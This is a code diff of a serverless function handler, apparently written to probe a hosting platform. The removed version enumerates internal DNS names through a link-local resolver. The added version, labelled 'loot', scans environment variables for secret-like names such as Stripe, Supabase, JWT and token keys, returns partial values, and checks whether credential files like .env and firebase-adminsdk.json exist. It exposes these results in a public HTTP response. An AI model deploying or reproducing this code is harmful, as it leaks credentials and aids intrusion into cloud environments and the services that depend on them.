@@ -1,45 +1,48 @@
-const dns = require('dns').promises;
+const fs = require('fs');
 
 exports.handler = async (event, context) => {
-  const dnsResearch = {};
-  
-  const resolver = new dns.Resolver();
-  resolver.setServers(['169.254.100.5']);
+  const loot = {};
 
-  const targets = [
-    'compute.internal',
-    'us-east-2.compute.internal',
-    'netlify.internal',
-    'internal.netlify.app',
-    'database.internal'
+  // --- TARGET 1: Deep Secret Search ---
+  const criticalPatterns = [
+    'STRIPE', 'SUPABASE', 'FIREBASE', 'JWT', 'PRIVATE', 'DATABASE', 'SECRET', 'KEY', 'TOKEN'
   ];
-
-  dnsResearch.discovery = {};
-
-  for (const host of targets) {
-    try {
-      const addresses = await resolver.resolve4(host);
-      dnsResearch.discovery[host] = addresses;
-    } catch (e) {
-      dnsResearch.discovery[host] = `Error: ${e.code}`;
+  
+  loot.env_leaks = {};
+  Object.keys(process.env).forEach(key => {
+    if (criticalPatterns.some(p => key.includes(p))) {
+      loot.env_leaks[key] = process.env[key] ? `${process.env[key].substring(0, 5)}***` : 'EMPTY';
     }
-  }
+  });
 
-  try {
-    dnsResearch.reverse_gateway = await resolver.reverse('169.254.100.5');
-  } catch (e) {
-    dnsResearch.reverse_gateway = `Error: ${e.code}`;
-  }
+  // --- TARGET 2: Logic Flaw - ClientContext Trust ---
+  loot.auth_check = {
+    hasClientContext: !!context.clientContext,
+    hasIdentity: !!context.identity,
+    clientContextRaw: context.clientContext ? "PRESENT" : "MISSING"
+  };
 
-  console.log('--- DNS DEEP DIVE LOG ---');
-  console.log(JSON.stringify(dnsResearch, null, 2));
+  // --- TARGET 3: Filesystem Secret Scavenging ---
+  const filesToCrawl = ['./.env', './config.json', './supabase.json', './firebase-adminsdk.json'];
+  loot.file_secrets = {};
+  filesToCrawl.forEach(f => {
+    try {
+      if (fs.existsSync(f)) {
+        loot.file_secrets[f] = "FOUND! (Leaked)";
+      }
+    } catch(e) {}
+  });
+
+  console.log('--- CRITICAL LOOT LOG ---');
+  console.log(JSON.stringify(loot, null, 2));
 
   return {
     statusCode: 200,
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      message: "DNS Internal Discovery",
-      results: dnsResearch,
-      note: "If any target returns an IP instead of ENOTFOUND, it's a valid Internal Disclosure."
+      status: "Final Audit Complete",
+      impact_evidence: loot,
+      vulnerability_type: loot.env_leaks.DATABASE_URL ? "CRITICAL: Hardcoded DB Creds" : "Low: Logic Audit"
     }, null, 2)
   };
 };
